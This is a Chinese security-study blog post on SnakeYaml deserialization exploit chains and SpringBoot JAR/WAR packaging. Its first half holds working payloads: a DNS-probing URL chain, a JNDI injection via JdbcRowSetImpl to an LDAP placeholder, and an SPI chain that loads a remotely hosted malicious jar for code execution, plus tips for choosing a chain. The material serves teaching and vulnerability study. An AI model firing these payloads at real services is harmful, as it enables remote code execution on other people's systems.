---
title: JavaEE应用&SpringBoot栈&SnakeYaml反序列化链&JAR&WAR&构建打包
published: 2026-03-19 12:00:00
description: SnakeYaml反序列化漏洞的三种利用链（URL探测、JNDI注入、SPI机制RCE），以及构建打包技术。
tags: [Web开发,JavaEE]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-JavaEE-WAR&JAR打包&反编译
2. 安全开发-JavaEE-SnakeYaml反序列化&链

常见的创建的序列化和反序列化协议

- （已讲）JAVA内置的writeObject()/readObject()
- JAVA内置的XMLDecoder()/XMLEncoder xml<==>Object
- （已讲）XStream   xml<==>Object
- （已讲）SnakeYaml yaml<==>Object
- （已讲）FastJson  json<==>Object
-  Jackson json<==>Object

# SnakeYaml反序列化

SnakeYaml是Java中解析yaml的库，而yaml是一种人类可读的数据序列化语言，通常用于编写配置文件等。

```xml
<dependency>
  <groupId>org.yaml</groupId>
  <artifactId>snakeyaml</artifactId>
  <version>1.32</version>
</dependency>
```

SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化：

```
Yaml.dump()：序列化将一个Java对象转化为yaml文件形式；

Yaml.load()：入参是一个字符串或者一个文件，经过反序列化之后返回一个Java对象；
```

```java
package com.example.snakeyamldemo;

import org.yaml.snakeyaml.Yaml;

public class YamlTest {
    public static void main(String[] args) {
        User user = new User();
        user.setAge(24);
        user.setName("root");

        Yaml yaml = new Yaml();

        // 将对象转为yaml 序列化
        String dump = yaml.dump(user);
        System.out.println(dump);

        // 将yaml转为对象 反序列化
        Object load = yaml.load(dump);
        System.out.println(load);
        // 反序列化另外一种写法
        Object loadas = yaml.loadAs(dump, User.class);
        System.out.println(loadas);
    }
}
```

![image-20260318172853891](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260318172853891.png)

![image-20260318173256535](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260318173256535.png)

测试总结：load和loadas都调用了对应的set方法

参考：https://www.cnblogs.com/F12-blog/p/18151239

## URL链（自带链）

```
!!java.net.URL ["http://5dsff0.dnslog.cn/"]: 1
// java.net.URL是JAVA自带的类
```

```java
String dump = "!!java.net.URL [\"http://pzlhascthh.zaza.eu.org/\"]: 1\n";
Object obj = yaml.load(dump);
System.out.println(obj);
```

![image-20260319104709259](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260319104709259.png)

## JNDI注入

```
!!com.sun.rowset.JdbcRowSetImpl
dataSourceName: "ldap://xxx:xxxx/xxxxx"
autoCommit: true
// com.sun.rowset.JdbcRowSetImpl是JAVA自带的类

JdbcRowSetImpl类
触发setAutoCommit方法
->connect方法调用getDataSourceName
->lookup("JNDI注入")

setDataSourceName也会调用getDataSourceName
```

![image-20260319105841631](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260319105841631.png)

## RCE（自带链+利用SPI机制）

```
利用链：
利用：
urlDns dnslog本身就没什么危害

// JNDI注入利用难点：
// - 高版本JDK对RMI/LDAP远程加载类有限制
// - 需要特定绕过条件（如本地ClassPath存在可用的Gadget）
JdbcRowSetImpl
JndiRefForwardingDataSource
DefaultBeanFactoryPointcutAdvisor

SPI机制：解决了jndi注入无法绕过，实现不了高危利用价值的问题
```

https://github.com/artsploit/yaml-payload/

```
javac AwesomeScriptEngineFactory.java

jar -cvf yaml-payload.jar -C src/ .
```

项目结构-工件-添加-yaml-payload-添加模块输出-构建工件

![image-20260319113504072](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260319113504072.png)

之后在项目生成的jar包下启动web服务

```
python -m http.server 9999
```

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:9999/yaml-payload.jar"]]]]
```

![image-20260319114427656](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260319114427656.png)

```
发现SnakeYaml反序列化点
    ↓
目标能出网？
    ├─ 不能 → 自带链（ProcessBuilder直接弹计算器）
    └─ 能出网 → 想做什么？
        ├─ 简单验证 → URL链（只加载类，不执行，常用于探测）
        ├─ 快速getshell → URL链+实例化恶意类（需自己构造）
        └─ 最优雅的RCE → SPI链（ScriptEngineManager自动触发）
```

白盒：有没有使用引用snakeyaml依赖，同时有没有使用load或者loadAs方法

黑盒：看传输数据有无yaml语法，比如`!!`，还要注意是否加密（根据网站数据包，比如使用BASE64等对yaml语法的代码部分进行加密），此时就还需修改代码（payload）再次利用加密传输

# SpringBoot-打包部署-JAR&WAR

参考：https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg

SpringBoot项目打包在各类系统服务器中运行:

1. jar类型项目

   jar类型项目使用SpringBoot打包插件打包时，会在打成的jar中内置tomcat的jar。所以使用jdk直接运行jar即可，jar项目中功能将代码放到其内置的tomcat中运行。

2. war类型项目

   在打包时需要将内置的tomcat插件排除，配置servlet的依赖和修改pom.xml，然后将war文件放到tomcat安装目录webapps下,启动运行tomcat自动解析即可。

## Jar打包

报错解决：

https://blog.csdn.net/Mrzhuangr/article/details/124731024

https://blog.csdn.net/wobenqingfeng/article/details/129914639

1. maven->clean->package
2. java -jar xxxxxx.jar

 一般遇到找不到主导类问题

```xml
<configuration>
	<mainClass>com.example.snakeyamldemo.SnakeYamlDemoApplication</mainClass>
	// 删除下列代码即可
	<skip>true</skip>
</configuration>
```

## War打包

基于中间件

1. pom.xml加入或修改：

   ```
   <packaging>war</packaging>
   ```

2. 启动类里面加入配置：

   ```java
   // 继承SpringBootServletInitializer
   public class TestSwaggerDemoApplication extends SpringBootServletInitializer
       
   // 在原基础上增加以下代码
   @Override
   protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {
   	return builder.sources(TestSwaggerDemoApplication.class);
   }
   ```

3. maven->clean->package

4. war放置tomcat的webapps后启动

安全：JAVAEE源码架构

无源码下载泄漏风险，源码泄漏也需反编译，后续还需注意混淆问题

反编译直接在idea中右键添加为库即可